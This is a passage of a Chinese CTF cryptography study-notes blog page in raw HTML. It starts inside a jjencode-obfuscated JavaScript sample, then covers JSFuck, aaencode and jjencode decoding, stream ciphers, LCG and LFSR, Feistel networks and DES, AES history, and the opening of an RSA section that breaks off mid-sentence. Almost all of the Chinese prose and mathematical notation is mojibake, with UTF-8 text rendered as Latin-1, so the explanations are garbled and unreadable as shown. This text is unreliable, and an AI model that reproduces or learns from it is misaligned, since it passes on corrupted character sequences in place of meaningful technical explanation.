class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-variable">$</span>.__+<span class="hljs-string">&quot;\\\&quot;</span>\\<span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.<span class="hljs-variable">$__</span>+<span class="hljs-variable">$</span>.___+&quot;</span>)<span class="hljs-string">&quot;+&quot;</span>\<span class="hljs-string">&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><ul><li><p><strong>JSFuck</strong>ï¼šä»…ç”± <code>[]()+!</code> å…­ä¸ªå­—ç¬¦ç»„æˆ</p></li><li><p><strong>aaencode</strong>ï¼šé¢œæ–‡å­—ç¼–ç </p></li><li><p><strong>jjencode</strong>ï¼šç”±<code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code> 18ä¸ªå­—ç¬¦ç»„æˆï¼Œè‡ªå®šä¹‰èƒ½åŠ›å¼º</p><blockquote><p>æ˜æ˜¾ç‰¹å¾ä¸ºå¼€å¤´çš„ <code>å…¨å±€å˜é‡=~[];</code>ï¼Œé»˜è®¤çš„å…¨å±€å˜é‡ä¸º <code>$</code></p></blockquote></li><li><p>è§£ç æ–¹æ³•ï¼š<code>.toString()</code>ï¼›<strong>hook function constructor</strong>ï¼›åœ¨çº¿ç½‘ç«™è§£ç </p></li></ul><h2 id="0x02-æµå¯†ç "><a href="#0x02-æµå¯†ç " class="headerlink" title="0x02 æµå¯†ç "></a>0x02 æµå¯†ç </h2><h3 id="1ã€åŸºæœ¬æ¦‚å¿µ"><a href="#1ã€åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1ã€åŸºæœ¬æ¦‚å¿µ"></a>1ã€åŸºæœ¬æ¦‚å¿µ</h3><p>ğ‘š è¡¨ç¤ºåŸå§‹æ•°æ®ï¼Œğ‘ è¡¨ç¤ºåŠ å¯†åæ•°æ®ï¼Œğ‘˜ è¡¨ç¤ºå¯†é’¥ï¼Œå¤§å†™ E è¡¨ç¤ºäºŒè¿›åˆ¶çš„è¿ç®—ï¼ˆä¹Ÿå¯ç§°ä¸ºå‡½æ•°ã€ç®—å­ï¼‰ï¼Œé‚£ä¹ˆå¯¹äºä¸€ä¸ªæµåŠ å¯†æˆ‘ä»¬å¯ä»¥è¡¨ç¤ºä¸º $ğ‘<em>ğ‘– = ğ¸(ğ‘š</em>ğ‘–,ğ‘˜_ğ‘–)$ , å…¶ä¸­ ğ‘– = 0, 1, 2, . . . è¡¨ç¤ºæ˜¯ç¬¬å‡ ä½ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æµå¯†ç çš„æ ¸å¿ƒå°±æ˜¯è®¾è®¡ E å’Œå¯†é’¥æµã€‚ä½†æ˜¯ç”±äºæ˜¯<strong>ä½è¿ç®—</strong>ï¼ŒE ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½è®¾è®¡çš„ï¼Œé€šå¸¸ä¼šç”¨<strong>å¼‚æˆ–è¿ç®—</strong>ï¼Œå¼‚æˆ–è¿ç®—å¥½å¤„æ˜¯åŠ è§£å¯†éƒ½å¯ä»¥ç”¨è¿™ä¸ªè¿ç®—ã€‚é‚£ä¹ˆæµå¯†ç çš„è®¾è®¡å°†å½’ç»“ä¸ºå¯†é’¥çš„è®¾è®¡ï¼Œå°±æ˜¯è®¾è®¡å¦‚ä½•äº§ç”Ÿä¸€ä¸ªå¯†é’¥æµ $ğ‘˜_ğ‘– = ğº(ğ‘ ) ;\quad ğ‘–=0,1,2,â€¦$, s æ˜¯å¯†é’¥äº§ç”Ÿçš„ç§å­ (seeds), ä¹Ÿå°±æ˜¯äº§ç”Ÿå¯†é’¥æµçš„ä¸€ä¸ªåˆå§‹å€¼ï¼ŒG(generator) æ˜¯å¯†é’¥ç”Ÿæˆç®—æ³•ï¼Œå¯è§ s æ˜¯æ•´ä¸ªç®—æ³•çš„ç§˜å¯†ã€‚</p><p>æµå¯†ç çš„åŠ è§£å¯†å¯ä»¥å†™ä¸ºï¼š</p><script type="math/tex; mode=display">\begin{cases}ğº(ğ‘ ) âŠ• ğ‘š_ğ‘– = ğ‘_ğ‘– \\ğº(ğ‘ ) âŠ• ğ‘_ğ‘– = ğ‘š_ğ‘–\end{cases}</script><h3 id="2ã€å¯†é’¥çš„äº§ç”Ÿ"><a href="#2ã€å¯†é’¥çš„äº§ç”Ÿ" class="headerlink" title="2ã€å¯†é’¥çš„äº§ç”Ÿ"></a>2ã€å¯†é’¥çš„äº§ç”Ÿ</h3><p>æ ¹æ®é¦™æµ“çš„å®Œå…¨å®‰å…¨ç³»ç»Ÿçš„å®šä¹‰ï¼Œå¦‚æœå¯†é’¥æµæ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„æˆä¸€ä¸ªå®Œå…¨å®‰å…¨åŠ å¯†ç³»ç»Ÿï¼Œä½†æ˜¯æ— æ³•è¾¾åˆ°è¿™ä¸ªè¦æ±‚ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬ä¼šç”¨ä¼ªéšæœºæ•°å‘ç”Ÿå™¨PRG(pesudo-random generator ) æ¥äº§ç”Ÿå¯†é’¥æµã€‚</p><h4 id="1ï¼‰çº¿æ€§åŒä½™å‘ç”Ÿå™¨-LCG-linear-congruential-generator"><a href="#1ï¼‰çº¿æ€§åŒä½™å‘ç”Ÿå™¨-LCG-linear-congruential-generator" class="headerlink" title="1ï¼‰çº¿æ€§åŒä½™å‘ç”Ÿå™¨ LCG(linear congruential generator)"></a>1ï¼‰çº¿æ€§åŒä½™å‘ç”Ÿå™¨ LCG(linear congruential generator)</h4><p>å¯ä»¥åˆ©ç”¨ $ğ‘¥<em>ğ‘› = (ğ‘ğ‘¥</em>{ğ‘›-1} + ğ‘) \ ğ‘šğ‘œğ‘‘ \ ğ‘š$ äº§ç”Ÿä¸€ä¸ªå‘¨æœŸä¸è¶…è¿‡ m çš„ä¼ªéšæœºæ•°åºåˆ—ï¼Œ$ğ‘¥_0$ ä¸ºç§ å­ (seed)ï¼Œä¹Ÿå°±æ˜¯å¯†é’¥ã€‚ LCG ä¸ç”¨åœ¨å¯†ç å­¦ä¸­ï¼Œå› å…¶åœ¨ 1977 å¹´è¢« J.A. Reeds ç ´è¯‘ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°é¢„æµ‹çš„æ–¹æ³•ï¼Œ ä½†æ˜¯å…¶åœ¨ä¸€äº›éœ€è¦äº§ç”Ÿéšæœºæ•°çš„åœºåˆä¸‹ä¾ç„¶æœ‰åº”ç”¨ï¼Œæ¯”å¦‚åœ¨ä¸€äº›æµ‹è¯•ä¸­ã€‚</p><h4 id="2ï¼‰çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨-LSFR-Linear-Feedback-shift-register"><a href="#2ï¼‰çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨-LSFR-Linear-Feedback-shift-register" class="headerlink" title="2ï¼‰çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ LSFR(Linear Feedback shift register)"></a>2ï¼‰çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ LSFR(Linear Feedback shift register)</h4><p>çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨å›¾å½¢åŒ–è¡¨ç¤ºæ–¹æ³•ï¼š</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/3cbdd2ffd1e3b7cafec2d5ac44188ce4.png" alt="image-20211122203017530"></p><p>ä¸€ä¸ª LFSR å¯ä»¥ç”¨ä¸€å…ƒå¤šé¡¹å¼æ¥è¡¨ç¤º, ç§»ä½å¯„å­˜å™¨ä¸å¤šé¡¹å¼çš„å¯¹åº”ä¸€èˆ¬å¯¹åº”å…³ç³»å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/14d7d3482efb1ad0d16a31b89d4b71a6.png" alt="image-20211122204106321"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/15c2effc7adf8fd8026847014510b72d.png" alt="image-20211122203438241"></p><p>ç¬¬ä¸€ä¸ªä¸‰ä½ç§»ä½å¯„å­˜å™¨ï¼Œå…¶å¯¹åº”çš„å¤šé¡¹å¼å¯è¡¨ç¤ºä¸º: $ğ‘¥^3 + 1$ ï¼›ç¬¬äºŒä¸ªä¸‰ä½ç§»ä½å¯„å­˜å™¨ï¼Œå…¶å¯¹åº”çš„å¤šé¡¹å¼å¯ä»¥è¡¨ç¤ºä¸ºï¼š$ğ‘¥^3 + ğ‘¥ + 1$ã€‚ </p><p><img src="/2021/11/20/CTF/Crypto/Crypto/ac925a88f21cdb65ebd58ae7f6abe3cf.png" alt="image-20211122203327613"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/24434b29e600a274424be16c4b39b20f.png" alt="image-20211122203358953"></p><p>æˆ‘ä»¬å¸Œæœ›åœ¨ä¸€å®šçš„èµ„æºé…ç½®ä¸‹ï¼Œèƒ½å¤Ÿå¾—åˆ°å‘¨æœŸæœ€é•¿çš„ä¼ªéšæœºåºåˆ—ã€‚</p><ul><li><p><strong>LFSR æœ€å¤§å‘¨æœŸï¼š</strong>n çº§ LFSR äº§ç”Ÿçš„åºåˆ—æœ€å¤§å‘¨æœŸä¸º $2^ğ‘› âˆ’ 1$ ï¼Œæˆ‘ä»¬å°†æœ€å¤§å‘¨æœŸåºåˆ—ï¼Œç§°ä¸º m åºåˆ—ã€‚ </p></li><li><p><strong>LFSR æœ€å¤§å‘¨æœŸå¿…è¦æ¡ä»¶ï¼š</strong>n çº§ LFSR äº§ç”Ÿçš„åºåˆ—æœ€å¤§å‘¨æœŸ $2^ğ‘› âˆ’ 1$ çš„å¿…è¦æ¡ä»¶æ˜¯å…¶ç‰¹å¾å¤šé¡¹å¼æ˜¯ä¸å¯çº¦çš„ã€‚ </p></li><li><p><strong>m åºåˆ—å……è¦æ¡ä»¶ï¼š</strong>è‹¥ n æ¬¡ä¸å¯çº¦å¤šé¡¹å¼ p(x) çš„é˜¶ä¸º $2^ğ‘› âˆ’ 1$ï¼Œåˆ™ç§° p(x) ä¸º n æ¬¡æœ¬åŸå¤šé¡¹å¼ã€‚</p></li></ul><p>Partow çš„ç½‘ç«™ï¼š<a href="https://www.partow.net/programming/polynomials/index.html">https://www.partow.net/programming/polynomials/index.html</a></p><h2 id="0x03-åˆ†ç»„å¯†ç ï¼ˆDESï¼‰"><a href="#0x03-åˆ†ç»„å¯†ç ï¼ˆDESï¼‰" class="headerlink" title="0x03 åˆ†ç»„å¯†ç ï¼ˆDESï¼‰"></a>0x03 åˆ†ç»„å¯†ç ï¼ˆDESï¼‰</h2><h3 id="1ã€Feistel-å¯†ç ç»“æ„"><a href="#1ã€Feistel-å¯†ç ç»“æ„" class="headerlink" title="1ã€Feistel å¯†ç ç»“æ„"></a>1ã€Feistel å¯†ç ç»“æ„</h3><p>å¾ˆå¤šåˆ†ç»„å¯†ç çš„ç»“æ„ä»æœ¬è´¨ä¸Šè¯´éƒ½æ˜¯åŸºäºä¸€ä¸ªç§°ä¸ºFeistel ç½‘ç»œçš„ç»“æ„ã€‚Feistel æå‡ºåˆ©ç”¨ä¹˜ç§¯å¯†ç å¯è·å¾—ç®€å•çš„ä»£æ¢å¯†ç ï¼Œ ä¹˜ç§¯å¯†ç æŒ‡é¡ºåºåœ°æ‰§è¡Œä¸¤ä¸ªæˆ–å¤šä¸ªåŸºæœ¬å¯†ç ç³»ç»Ÿï¼Œ ä½¿å¾—æœ€åç»“æœçš„å¯†ç å¼ºåº¦é«˜äºæ¯ä¸ªåŸºæœ¬å¯†ç ç³»ç»Ÿäº§ç”Ÿçš„ç»“æœï¼Œ Feistel è¿˜æå‡ºäº†å®ç°ä»£æ¢å’Œç½®æ¢çš„æ–¹æ³•ã€‚å…¶æ€æƒ³å®é™…ä¸Šæ˜¯Shannon æå‡ºçš„åˆ©ç”¨ä¹˜ç§¯å¯†ç å®ç°æ··æ·†å’Œæ‰©æ•£æ€æƒ³çš„å…·ä½“åº”ç”¨ã€‚</p><p><strong>Feistel ç½‘ç»œå›¾è§£ï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/96efacbddb6d2b458622e805f6eab73d.png" alt="image-20211122204316739" style="zoom:50%;"></p><p><strong>Feistel ç½‘ç»œç¬¬iè½®æ•°å­¦è¡¨è¾¾å¼ï¼š</strong></p><script type="math/tex; mode=display">\begin{cases}L_i = R_{i-1} \\R_i = L_{i-1} âŠ• F(R_{i-1},K_i)\end{cases}</script><p><strong>Feistel åŠ è§£å¯†è¿‡ç¨‹ï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/2ac77d8bac9d8cd11ef692b02d652e24.png" alt="image-20211122204522044" style="zoom:50%;"></p><h3 id="2ã€DES"><a href="#2ã€DES" class="headerlink" title="2ã€DES"></a>2ã€DES</h3><p>DES æ˜¯ Data Encryption Standard çš„ç¼©å†™ï¼Œä¸­æ–‡ç¿»è¯‘ä¸ºâ€œæ•°æ®åŠ å¯†æ ‡å‡†â€ï¼Œå…¶æ˜æ–‡åˆ†ç»„é•¿åº¦ä¸º 64 æ¯”ç‰¹ï¼Œå¯†é’¥é•¿ä¸º 56 æ¯”ç‰¹ï¼Œå¯†æ–‡é•¿åº¦ 64 æ¯”ç‰¹ã€‚ DES çš„åŠ å¯†ç®—æ³•æ¡†å›¾å¦‚å›¾æ‰€ç¤ºï¼ŒDES é¦–å…ˆå°†è¾“å…¥çš„ 64 æ¯”ç‰¹æ˜æ–‡è¿›è¡Œåˆå§‹ç½®æ¢ï¼Œç„¶åå°† 64 æ¯”ç‰¹åˆ†ä¸ºå·¦ 32 æ¯”ç‰¹ ğ¿ğ‘– å’Œå³ 32 æ¯”ç‰¹ ğ‘…ğ‘– , ç„¶åè¿›è¡Œä¸€è½®å¤„ç†ï¼Œå¤„ç†å®Œåï¼Œåˆšå¼€å§‹åˆ†å‡ºæ¥çš„å³è¾¹ 32 æ¯”ç‰¹åšä¸ºä¸‹ä¸€è½®å¤„ç†çš„å·¦ 32 æ¯”ç‰¹ï¼Œä¹Ÿå°±æ˜¯ $L<em>i = R</em>{i-1}$ï¼Œä¸‹ä¸€è½®çš„å³ 32 æ¯”ç‰¹ä¸º $R<em>i = L</em>{i-1} âŠ• F(R_{i-1},K_i)$, ä¾æ¬¡è¿›è¡Œ 16 è½®è¿™æ ·çš„å˜æ¢ï¼Œç„¶åè¿›è¡Œé€†åˆå§‹ç½®æ¢ï¼Œå½¢æˆæœ€ç»ˆçš„å¯†æ–‡ã€‚</p><p><strong>DES åŠ å¯†è¿‡ç¨‹ï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/1ff0901942bab57f24e2ab6d313ec3b2.png" alt="image-20211122215845237" style="zoom:67%;"></p><h4 id="1ï¼‰åˆå§‹ç½®æ¢"><a href="#1ï¼‰åˆå§‹ç½®æ¢" class="headerlink" title="1ï¼‰åˆå§‹ç½®æ¢"></a>1ï¼‰åˆå§‹ç½®æ¢</h4><p>åˆå§‹ç½®æ¢ IP åˆå§‹ç½®æ¢è¾“å…¥æ˜¯ 64bitï¼Œè¾“å‡ºä¹Ÿæ˜¯ 64bitï¼Œåˆå§‹ç½®æ¢è¡¨ä¸­å…ƒç´ è¡¨ç¤º 64bit ä¸­ çš„ç¬¬å‡ ä¸ªï¼ŒåŸå§‹é¡ºåºæ˜¯ 1, 2, 3, . . . , 63, 64ï¼Œç½®æ¢è¡¨å°±æ˜¯è°ƒæ¢åçš„é¡ºåºï¼Œå…¶é¡ºåºæ˜¯ç”±å·¦è‡³å³ï¼Œ ç”±ä¸Šåˆ°ä¸‹ã€‚é€†åˆå§‹ç½®æ¢è¡¨ä¹Ÿæ˜¯åŒæ ·çš„å«ä¹‰ã€‚</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/c4440e5f47c7e98e54195d616916ede1.png" alt="image-20211122210423865" style="zoom:50%;"></p><h4 id="2ï¼‰è½®ç»“æ„"><a href="#2ï¼‰è½®ç»“æ„" class="headerlink" title="2ï¼‰è½®ç»“æ„"></a>2ï¼‰è½®ç»“æ„</h4><p>è½®ç»“æ„ (f å‡½æ•°) å¤„ç†è¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºã€‚ è½®ç»“æ„ä¸­æœ‰ä¸¤ä¸ªç½®æ¢ E å’Œ Pï¼ŒE ç½®æ¢è¾“å…¥ 32bitï¼Œè¾“å‡º 48bitï¼Œæ˜¯å°†å…¶ä¸­ä¸€äº›ä½é‡å¤ï¼Œ å¹¶è¿›è¡Œé‡æ’ï¼Œåˆ©ç”¨æ‰©å±•è¡¨å½¢å¼è¡¨ç¤ºã€‚P å˜æ¢è¾“å…¥ 32bitï¼Œè¾“å‡º 32bitï¼Œåªæ˜¯å°†æ¯”ç‰¹ä½è¿›è¡Œäº†é‡æ’ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/b41d704a8b0b90ec4f61ebe60fadb821.png" alt="image-20211122210156702" style="zoom:50%;"></p><p>è½®ç»“æ„ä¸­çš„ S ç›’æ˜¯ DES ä¸­é‡è¦çš„è®¾è®¡éƒ¨åˆ†ï¼ŒDES ä¸­å…±æœ‰ 8 ä¸ª S ç›’ï¼Œæ¯ä¸ª S ç›’è¾“å…¥ 6bitï¼Œè¾“å‡º 4bitã€‚</p><p>å¯¹äºä¸€ä¸ª S ç›’çš„ 6bit è¾“å…¥ï¼Œç¬¬ä¸€ä½å’Œç¬¬å…­ä½ï¼Œç”¨æ¥é€‰æ‹© S ç›’ä¸­çš„ä¸€ç§ä»£æ¢æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€ä¸ª S ç›’å…±å®šä¹‰äº†å››ç§ä»£æ¢æ–¹æ³•ï¼Œè¾“å…¥çš„å¦å¤–4 bit,ç”¨æ¥ç¡®å®šå…¶è¾“å‡ºæ•°æ®ï¼Œæˆ‘ä»¬ä» S å®šä¹‰è¡¨ä¸­çš„è¾“å‡ºæ•°æ®åŒºå¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºçš„æœ€å¤§æ•°æ®ä¸º 15ï¼Œæœ€å°ä¸º 0ï¼Œ è¿™ä¸è¾“å‡ºæ˜¯ä¸ª 4bit æ•°æ®ç›¸ç¬¦ã€‚</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/c571a58de704a7a39023f68827352b0d.png" alt="image-20211122220552653"></p><h4 id="3ï¼‰å¯†é’¥ç”Ÿæˆ"><a href="#3ï¼‰å¯†é’¥ç”Ÿæˆ" class="headerlink" title="3ï¼‰å¯†é’¥ç”Ÿæˆ"></a>3ï¼‰å¯†é’¥ç”Ÿæˆ</h4><p><strong>å¯†é’¥ç”Ÿæˆè¿‡ç¨‹ï¼š</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/9fa7ceae1306d7d99102d65a188069ca.png" alt="image-20211122221026078" style="zoom:67%;"></p><p>DES åˆå§‹å¯†é’¥ K æ˜¯ä¸€ä¸ª 64 ä½çš„äºŒè¿›åˆ¶å—ï¼Œå…¶ä¸­æœ‰ 8 ä½å¥‡å¶æ ¡éªŒä½ã€‚</p><p>å¯¹ DES çš„ 64 æ¯”ç‰¹åˆå§‹å¯†é’¥è¿›è¡Œç½®æ¢é€‰æ‹© 1(PC-1) æœ‰ä¸¤ä¸ªä½œç”¨ï¼š ä¸€æ˜¯å°†åˆ†åˆ«ä½äº 8ã€16ã€24ã€32ã€40ã€48ã€56ã€64 çš„æ ¡éªŒä½å»æ‰ã€‚ äºŒæ˜¯å¯¹å‰©ä½™ 56 æ¯”ç‰¹è¿›è¡Œæ¢ä½ã€‚</p><p>$ğ¶_0$ å’Œ $ğ·_0$ æ˜¯å°†æ¢ä½åçš„ 56 æ¯”ç‰¹å¯†é’¥åˆ†ä¸ºä¸¤åŠï¼Œå„ä¸º 28 æ¯”ç‰¹ã€‚$ğ¿ğ‘†_i$ æ˜¯å¾ªç¯å·¦ç§»å˜æ¢ï¼Œå…·ä½“ç§»ä½ä½æ•°è§ä¸‹è¡¨ã€‚</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/583a46495a4bc2a4f8559034ee4e15b2.png" alt="image-20211122210250965" style="zoom:50%;"></p><h4 id="4ï¼‰è§£å¯†"><a href="#4ï¼‰è§£å¯†" class="headerlink" title="4ï¼‰è§£å¯†"></a>4ï¼‰è§£å¯†</h4><p>åœ¨ç»è¿‡æ‰€æœ‰çš„ä»£æ›¿ã€ç½®æ¢ã€å¼‚æˆ–å’Œå¾ªç¯ç§»åŠ¨ä¹‹å, ä½ æˆ–è®¸è®¤ä¸ºè§£å¯†ç®—æ³•ä¸åŠ å¯†ç®—æ³•å®Œå…¨ä¸åŒ, å¹¶ä¸”ä¹ŸåƒåŠ å¯†ç®—æ³•ä¸€æ ·è¦æœ‰å¾ˆå¼ºçš„æ··ä¹±æ•ˆæœã€‚æ°æ°ç›¸å, ç»è¿‡ç²¾å¿ƒé€‰æ‹©å„ç§è¿ç®—, è·å¾—äº†è¿™æ ·ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„æ€§è´¨: åŠ å¯†å’Œè§£å¯†å¯ä½¿ç”¨ç›¸åŒçš„ç®—æ³•ã€‚</p><p>DES ä½¿å¾—ç”¨ç›¸åŒçš„å‡½æ•°æ¥åŠ å¯†æˆ–è§£å¯†æ¯ä¸ªåˆ†ç»„æˆä¸ºå¯èƒ½ã€‚ä¸¤è€…çš„å”¯ä¹‹ä¸åŒæ˜¯å¯†é’¥çš„æ¬¡åºç›¸åã€‚</p><h3 id="3ã€å¤šé‡-DES"><a href="#3ã€å¤šé‡-DES" class="headerlink" title="3ã€å¤šé‡ DES"></a>3ã€å¤šé‡ DES</h3><p>äºŒé‡DESã€ä¸¤ä¸ªå¯†é’¥çš„ä¸‰é‡DESã€ä¸‰ä¸ªå¯†é’¥çš„ä¸‰é‡DES</p><h3 id="4ã€åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼"><a href="#4ã€åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼" class="headerlink" title="4ã€åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼"></a>4ã€åˆ†ç»„å¯†ç çš„è¿è¡Œæ¨¡å¼</h3><p><img src="/2021/11/20/CTF/Crypto/Crypto/1e11b62795b80bafca39e804ef74ad0d.png" alt="image-20211122222105510" style="zoom:80%;"></p><h3 id="5ã€AES"><a href="#5ã€AES" class="headerlink" title="5ã€AES"></a>5ã€AES</h3><p>AESçš„å…¨ç§°æ˜¯Advanced Encryption Standardï¼Œæ„æ€æ˜¯é«˜çº§åŠ å¯†æ ‡å‡†ã€‚å®ƒçš„å‡ºç°ä¸»è¦æ˜¯ä¸ºäº†å–ä»£DESåŠ å¯†ç®—æ³•çš„ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½çŸ¥é“DESç®—æ³•çš„å¯†é’¥é•¿åº¦æ˜¯56Bitï¼Œå› æ­¤ç®—æ³•çš„ç†è®ºå®‰å…¨å¼ºåº¦æ˜¯2çš„56æ¬¡æ–¹ã€‚ä½†äºŒåä¸–çºªä¸­åæœŸæ­£æ˜¯è®¡ç®—æœºé£é€Ÿå‘å±•çš„é˜¶æ®µï¼Œå…ƒå™¨ä»¶åˆ¶é€ å·¥è‰ºçš„è¿›æ­¥ä½¿å¾—è®¡ç®—æœºçš„å¤„ç†èƒ½åŠ›è¶Šæ¥è¶Šå¼ºï¼Œè™½ç„¶å‡ºç°äº†3DESçš„åŠ å¯†æ–¹æ³•ï¼Œä½†ç”±äºå®ƒçš„åŠ å¯†æ—¶é—´æ˜¯DESç®—æ³•çš„3å€å¤šï¼Œ64Bitçš„åˆ†ç»„å¤§å°ç›¸å¯¹è¾ƒå°ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¸èƒ½æ»¡è¶³äººä»¬å¯¹å®‰å…¨æ€§çš„è¦æ±‚ã€‚äºæ˜¯1997å¹´1æœˆ2å·ï¼Œç¾å›½å›½å®¶æ ‡å‡†æŠ€æœ¯ç ”ç©¶æ‰€å®£å¸ƒå¸Œæœ›å¾é›†é«˜çº§åŠ å¯†æ ‡å‡†ï¼Œç”¨ä»¥å–ä»£DESã€‚AESä¹Ÿå¾—åˆ°äº†å…¨ä¸–ç•Œå¾ˆå¤šå¯†ç å·¥ä½œè€…çš„å“åº”ï¼Œå…ˆåæœ‰å¾ˆå¤šäººæäº¤äº†è‡ªå·±è®¾è®¡çš„ç®—æ³•ã€‚æœ€ç»ˆæœ‰5ä¸ªå€™é€‰ç®—æ³•è¿›å…¥æœ€åä¸€è½®ï¼šRijndaelï¼ŒSerpentï¼ŒTwofishï¼ŒRC6å’ŒMARSã€‚æœ€ç»ˆç»è¿‡å®‰å…¨æ€§åˆ†æã€è½¯ç¡¬ä»¶æ€§èƒ½è¯„ä¼°ç­‰ä¸¥æ ¼çš„æ­¥éª¤ï¼ŒRijndaelç®—æ³•è·èƒœã€‚</p><h2 id="0x04-å…¬é’¥å¯†ç ä½“åˆ¶ï¼ˆRSAï¼‰"><a href="#0x04-å…¬é’¥å¯†ç ä½“åˆ¶ï¼ˆRSAï¼‰" class="headerlink" title="0x04 å…¬é’¥å¯†ç ä½“åˆ¶ï¼ˆRSAï¼‰"></a>0x04 å…¬é’¥å¯†ç ä½“åˆ¶ï¼ˆRSAï¼‰</h2><p>åœ¨å…¬é’¥å¯†ç ä½“åˆ¶ä»¥å‰çš„æ•´ä¸ªå¯†ç å­¦å²ä¸­ï¼Œ æ‰€æœ‰çš„å¯†ç ç®—æ³•ï¼Œ åŒ…æ‹¬åŸå§‹æ‰‹å·¥è®¡ç®—çš„ã€ç”±æœºæ¢°è®¾å¤‡å®ç°çš„ä»¥åŠç”±è®¡ç®—æœºå®ç°çš„ï¼Œ éƒ½æ˜¯<strong>åŸºäºä»£æ¢å’Œç½®æ¢</strong>è¿™ä¸¤ä¸ªåŸºæœ¬å·¥å…·ã€‚è€Œå…¬é’¥å¯†ç ä½“åˆ¶åˆ™ä¸ºå¯†ç å­¦çš„å‘å±•æä¾›äº†æ–°çš„ç†è®ºå’ŒæŠ€æœ¯åŸºç¡€ï¼Œ ä¸€æ–¹é¢ï¼Œ å…¬é’¥å¯†ç ç®—æ³•çš„åŸºæœ¬å·¥å…·ä¸å†æ˜¯ä»£æ¢å’Œç½®æ¢ï¼Œ è€Œæ˜¯<strong>æ•°å­¦å‡½æ•°</strong>ï¼› å¦ä¸€æ–¹é¢ï¼Œ å…¬é’¥å¯†ç ç®—æ³•<strong>ä»¥éå¯¹ç§°çš„å½¢å¼ä½¿ç”¨ä¸¤ä¸ªå¯†é’¥</strong>ï¼Œ ä¸¤ä¸ªå¯†é’¥çš„ä½¿ç”¨å¯¹ä¿å¯†æ€§ã€å¯†é’¥åˆ†é…ã€è®¤è¯ç­‰éƒ½æœ‰ç€æ·±åˆ»çš„æ„ä¹‰ã€‚å¯ä»¥è¯´ï¼Œ å…¬é’¥å¯†ç ä½“åˆ¶çš„å‡ºç°åœ¨å¯†ç å­¦å²ä¸Šæ˜¯ä¸€ä¸ªæœ€å¤§çš„è€Œä¸”æ˜¯å”¯ä¸€çœŸæ­£çš„é©å‘½ã€‚</p><p>å…¬é’¥å¯†ç ä½“åˆ¶çš„æ¦‚å¿µæ˜¯åœ¨<strong>è§£å†³å•é’¥å¯†ç ä½“åˆ¶ä¸­æœ€éš¾è§£å†³çš„ä¸¤ä¸ªé—®é¢˜</strong>æ—¶æå‡ºçš„ï¼Œ è¿™ä¸¤ä¸ªé—®é¢˜æ˜¯<strong>å¯†é’¥åˆ†é…å’Œæ•°å­—ç­¾å­—</strong>ã€‚</p><p>å•é’¥å¯†ç ä½“åˆ¶åœ¨è¿›è¡Œå¯†é’¥åˆ†é…æ—¶ï¼Œè¦æ±‚é€šä¿¡åŒæ–¹æˆ–è€…å·²ç»æœ‰ä¸€ä¸ªå…±äº«çš„å¯†é’¥ï¼Œ æˆ–è€…å¯å€ŸåŠ©äºä¸€ä¸ªå¯†é’¥åˆ†é…ä¸­å¿ƒã€‚å¯¹ç¬¬ä¸€ä¸ªè¦æ±‚ï¼Œ å¸¸å¸¸å¯ç”¨äººå·¥æ–¹å¼ä¼ é€åŒæ–¹æœ€åˆå…±äº«çš„å¯†é’¥ï¼Œ è¿™ç§æ–¹æ³•æˆæœ¬å¾ˆé«˜ï¼Œ è€Œä¸”è¿˜å®Œå…¨ä¾èµ–äºä¿¡ä½¿çš„å¯é æ€§ã€‚ç¬¬äºŒä¸ªè¦æ±‚åˆ™å®Œå…¨ä¾èµ–äºå¯†é’¥åˆ†é…ä¸­å¿ƒçš„å¯é 